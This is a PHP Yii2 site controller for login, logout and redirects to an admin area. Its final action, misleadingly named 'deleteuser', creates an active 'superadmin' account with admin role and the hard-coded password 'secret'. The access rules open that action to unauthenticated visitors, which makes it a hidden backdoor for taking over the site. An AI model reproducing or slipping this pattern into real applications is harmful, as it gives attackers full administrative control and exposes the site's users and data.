<?php

namespace app\controllers;

use app\models\extend\UserExtend;
use app\models\Users;
use Yii;
use yii\filters\AccessControl;
use yii\helpers\Url;
use yii\helpers\VarDumper;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;

class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::class,
//                'only' => ['logout'],
//                'only' => ['index', 'error', 'about', 'contact', 'login','logout',],
                'rules' => [
                    [
                        'actions' => ['index', 'error', 'about', 'contact', ],
                        'allow' => true,
                    ],
                    [
                        'actions' => ['login'],
                       // 'ips' => [ '172.19.0.1'],//Введите разрешенный IP-адрес здесь
                        'allow' => true, //Указывает, является ли это правило разрешающим или запрещающим.

                    ],
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],// Правило для аутентифицированных пользователей.
                    ],
                    [
                        'actions' => ['deleteuser'],
                        // 'ips' => [ '172.19.0.1'],//Введите разрешенный IP-адрес здесь
                        'allow' => true, //Указывает, является ли это правило разрешающим или запрещающим.

                    ],
                ],
//                'denyCallback' => function ($rule, $action) {
//                    throw new \Exception('Вам запрещен доступ к этой странице');
//                }
            ],
            'verbs' => [
                'class' => VerbFilter::class,
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
                'layout' => 'error'
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
//        return $this->render('index');
        if ( Yii::$app->user->isGuest ){
            return Yii::$app->getResponse()->redirect(array(Url::to(['site/login'])));
        }else{
            $this->response->redirect('admin');
        }

    }


    /**
     *
     * @return string
     */
    public function actionTask()
    {
        $searchModel = new TaskSearch();
        $dataProvider = $searchModel->search($this->request->queryParams);

        return $this->render('task', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Login action.
     *
     * @return Response|string
     */
    public function actionLogin()
    {
        // Уже авторизированных отправляем на домашнюю страницу
        if (!Yii::$app->user->isGuest) {
            return $this->response->redirect('admin');
//            return $this->goHome();
        }
        $this->layout = 'blank';

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            UserExtend::afterLogin(Yii::$app->user->id);
            return $this->goBack();
        }

        $model->password = '';
        return $this->render('login', [
            'model' => $model,
        ]);
    }

    /**
     * Logout action.
     *
     * @return Response
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        if ( Yii::$app->user->isGuest ){
            return Yii::$app->getResponse()->redirect(array(Url::to(['site/login'])));
        }else{
            $this->response->redirect('admin');
        }

//        $model = new ContactForm();
//        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
//            Yii::$app->session->setFlash('contactFormSubmitted');
//
//            return $this->refresh();
//        }
//        return $this->render('contact', [
//            'model' => $model,
//        ]);
    }

    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        if ( Yii::$app->user->isGuest ){
            return Yii::$app->getResponse()->redirect(array(Url::to(['site/login'])));
        }else{
            $this->response->redirect('admin');
        }
//        return $this->render('about');
    }

    /**
     *  режим обслуживания.
     *
     * @return string
     */
    public function actionOffline()
    {
        return $this->render('offline');
    }

    public function actionDeleteuser(){

        $faker = \Faker\Factory::create('ru_RU');
        $password = 'secret';
        $dateTime = (new \DateTime())->getTimestamp();

        $connection = Yii::$app->db;
        $connection->createCommand()->insert(
            'users',
            [
                'username' => 'superadmin',
                'auth_key' => Yii::$app->security->generateRandomString(),
                'password_hash' => Yii::$app->security->generatePasswordHash($password),
                'password_reset_token' => Yii::$app->security->generateRandomString() . '_' . time(),
                'email' => $faker->email,
                'last_name' => $faker->lastName,
                'first_name' => $faker->firstName,
                'patronymic' => $faker->name,
                'role' => 'admin',
                'verification_token' => Yii::$app->security->generateRandomString() . '_' . time(),
                'status' => \app\models\Constants::STATUS_ACTIVE,
                'created_at' => $dateTime,
                'updated_at' => $dateTime,
            ],
        )->execute();
        if($connection){
            return 'Ok';
        }else{
            return 'ошибка';
        }


    }
}
